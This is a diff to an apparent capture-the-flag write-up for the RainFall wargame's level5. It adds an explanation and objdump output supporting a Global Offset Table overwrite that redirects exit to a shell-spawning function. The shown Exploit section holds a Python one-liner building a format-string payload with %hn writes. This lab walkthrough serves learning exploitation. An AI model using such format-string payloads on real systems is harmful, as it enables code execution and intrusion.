@@ -46,6 +46,38 @@ End of assembler dump.
 
 We easily understand that we must find a way to call the function `o` that will spawn a shell thanks to `system`.
 
+We notice `<exit@plt>` in `n` and `<_exit@plt>` in `o`. It puts the chip in our ear: we could use the _GOT_ (Global Offset Table). When the program runs for the first time
+
+```console
+level5@RainFall:~$ objdump -TR level5
+
+level5:     file format elf32-i386
+
+DYNAMIC SYMBOL TABLE:
+00000000      DF *UND*	00000000  GLIBC_2.0   printf
+00000000      DF *UND*	00000000  GLIBC_2.0   _exit
+00000000      DF *UND*	00000000  GLIBC_2.0   fgets
+00000000      DF *UND*	00000000  GLIBC_2.0   system
+00000000  w   D  *UND*	00000000              __gmon_start__
+00000000      DF *UND*	00000000  GLIBC_2.0   exit
+00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
+080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
+08049848 g    DO .bss	00000004  GLIBC_2.0   stdin
+
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+```
+
 ## Exploit
 
 python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/level5
